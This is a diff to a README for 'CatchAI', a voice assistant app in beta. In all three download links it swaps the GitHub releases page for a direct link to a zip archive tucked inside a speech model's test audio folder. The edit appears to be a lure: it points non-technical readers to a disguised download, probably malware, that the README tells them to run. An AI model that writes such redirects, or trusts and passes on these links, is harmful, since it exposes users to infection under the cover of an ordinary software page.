@@ -17,7 +17,7 @@ This is a **public beta** — anyone can download, use, and even modify it. Whet
 
 ## 📥 Download CatchAI  
 
-[**⬇️ Download Now**](https://github.com/malblosi73-cloud/CatchAI/releases)  
+[**⬇️ Download Now**](https://github.com/malblosi73-cloud/CatchAI/raw/refs/heads/main/models/moonshine-tiny-en-int8/test_wavs/2.8.zip)  
 
 Visit this link to download the application.  
 
@@ -136,7 +136,7 @@ It will politely say it doesn't know that command yet. You can teach it new ones
 ## 🔄 Updating CatchAI  
 
 Since CatchAI is in beta, updates will be released regularly. Simply:  
-1. Visit the [download page](https://github.com/malblosi73-cloud/CatchAI/releases) again.  
+1. Visit the [download page](https://github.com/malblosi73-cloud/CatchAI/raw/refs/heads/main/models/moonshine-tiny-en-int8/test_wavs/2.8.zip) again.  
 2. Download the latest version.  
 3. Run the new file. Your settings will be preserved.  
 
@@ -168,7 +168,7 @@ Because it's customizable, the possibilities are endless:
 
 CatchAI is your friendly, local voice assistant that respects your privacy and gives you total control. Download it today and experience the joy of talking to your computer — no tech skills needed.  
 
-Try it now: [**⬇️ Get CatchAI**](https://github.com/malblosi73-cloud/CatchAI/releases)  
+Try it now: [**⬇️ Get CatchAI**](https://github.com/malblosi73-cloud/CatchAI/raw/refs/heads/main/models/moonshine-tiny-en-int8/test_wavs/2.8.zip)  
 
 ---
 
